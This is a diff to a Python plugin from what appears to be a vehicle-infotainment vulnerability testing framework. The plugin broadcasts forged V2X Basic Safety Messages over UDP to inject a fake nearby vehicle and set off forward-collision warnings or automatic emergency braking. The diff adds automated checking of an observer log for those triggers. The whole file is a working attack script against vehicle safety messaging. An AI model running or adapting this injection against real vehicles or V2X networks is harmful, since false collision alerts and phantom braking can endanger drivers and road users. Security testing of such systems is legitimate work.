@@ -7,11 +7,13 @@ Severity: High
 CVSS: 7.5
 Description: 伪造V2X BSM消息注入虚假车辆位置和速度信息
 Prerequisites: 与 OBU 处于同一局域网(基于UDP的车载DSRC路由)，或本机配备专用 C-V2X (PC5) 或 DSRC (802.11p) 射频模块。默认使用 UDP 端口 5000进行测试播发。
-Usage: python3 66_V2X_BSM_Injection.py <target_ip_or_broadcast>
+Usage: python3 67_V2X_BSM_Injection.py <target_ip_or_broadcast>
 """
 import sys
 import time
 import socket
+import os
+import re
 from iv_plugin_base import IVIVulnerabilityPlugin
 
 class V2XBSMInjectionPlugin(IVIVulnerabilityPlugin):
@@ -26,9 +28,18 @@ class V2XBSMInjectionPlugin(IVIVulnerabilityPlugin):
 
     def check_prerequisites(self):
         self.bind_ip = self.params.get("target_ip", "255.255.255.255")
+        self.observer_file = self.params.get("observer_file")
+        self.success_regex = self.params.get("success_regex", r"FCW|AEB|Forward Collision|Emergency Brake")
+        self.observe_seconds = float(self.params.get("observe_seconds", 3))
         if self.bind_ip == "N/A":
              self.bind_ip = "255.255.255.255"
         return True
+
+    def _read_observer_tail(self, path):
+        if not path or not os.path.exists(path):
+            return ""
+        with open(path, "r", encoding="utf-8", errors="ignore") as handle:
+            return handle.read()
 
     def exploit(self):
         self.logger.info("准备发起 V2X BSM 幽灵车辆碰撞欺骗攻击 (SAE J2735)...")
@@ -61,6 +72,7 @@ class V2XBSMInjectionPlugin(IVIVulnerabilityPlugin):
         v2x_port = 5000 # 很多 V2X 实验设备 OBU 读取 UDP V2X Payload 的默认端口
         
         try:
+            pre_observer = self._read_observer_tail(self.observer_file)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
             
@@ -70,14 +82,21 @@ class V2XBSMInjectionPlugin(IVIVulnerabilityPlugin):
             for i in range(3):
                 sock.sendto(malicious_bsm, (self.bind_ip, v2x_port))
                 time.sleep(0.1)
-                
-            self.logger.warning("[!] BSM 幽灵车验证报文发送完毕！探测级别足够触发警告。")
-            self.logger.warning("[!] 观察目标车辆的仪表盘：如果突然弹出前向碰撞预警(FCW)或自动紧急制动(AEB)被激活，则存在 V2X 消息无认证接收或证书撤销检查(CRL)失效的严重漏洞！")
+
+            time.sleep(self.observe_seconds)
+            post_observer = self._read_observer_tail(self.observer_file)
+            new_content = post_observer[len(pre_observer):] if post_observer.startswith(pre_observer) else post_observer
+            if new_content and re.search(self.success_regex, new_content, flags=re.IGNORECASE):
+                return {
+                    "status": "success",
+                    "vulnerable": True,
+                    "details": f"Observer evidence matched /{self.success_regex}/ after BSM injection: {new_content[-200:]}",
+                }
             
             return {
                 "status": "success",
                 "vulnerable": False,
-                "details": "BSM 注入已完成，需人工确认目标是否错误触发 FCW/AEB 后才能判定漏洞存在。"
+                "details": "BSM injection transmitted, but no observer_file evidence matched the configured trigger regex."
             }
 
         except Exception as e:
@@ -88,7 +107,7 @@ class V2XBSMInjectionPlugin(IVIVulnerabilityPlugin):
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
-        print("Usage: python3 66_V2X_BSM_Injection.py <target_ip_or_broadcast>")
+        print("Usage: python3 67_V2X_BSM_Injection.py <target_ip_or_broadcast>")
         sys.exit(1)
     plugin = V2XBSMInjectionPlugin({"target_ip": sys.argv[1]})
     plugin.run_verify()
